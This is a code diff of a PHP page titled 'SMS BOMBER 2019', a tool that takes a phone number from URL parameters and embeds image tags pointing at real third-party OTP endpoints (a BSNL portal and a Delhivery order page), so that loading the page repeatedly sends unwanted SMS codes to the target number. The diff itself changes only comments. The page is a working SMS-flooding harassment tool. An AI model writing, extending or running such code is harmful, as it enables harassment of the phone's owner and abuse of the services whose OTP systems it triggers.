@@ -2,11 +2,11 @@
 error_reporting(0);
 $tel_no=$_GET['phone'];
 $name=$_GET['name'];
-$c=$_GET['c']?$_GET['c']:0; //
+$c=$_GET['c']?$_GET['c']:0; 
 $c++;
 $count=$_GET['counts'];
 ?>
-<!DOCTYPE html>
+<!DOCTYPE html> //here html starts
 <html lang="en">
 <head>
 	<title>SMS BOMBER 2019</title>
@@ -143,7 +143,7 @@ $tel_no=1;
 <img src='https://portal2.bsnl.in/myportal/validatemobile.do?mobile=<?php echo $tel_no;?>'>
 <img src='https://direct.delhivery.com/order/generate-otp?phoneNo=<?php echo $tel_no;?>'
 </body>
-</html>
+</html> //here html ends
 <!--API CLOSE FOR SMS-->
 <?php
 	}
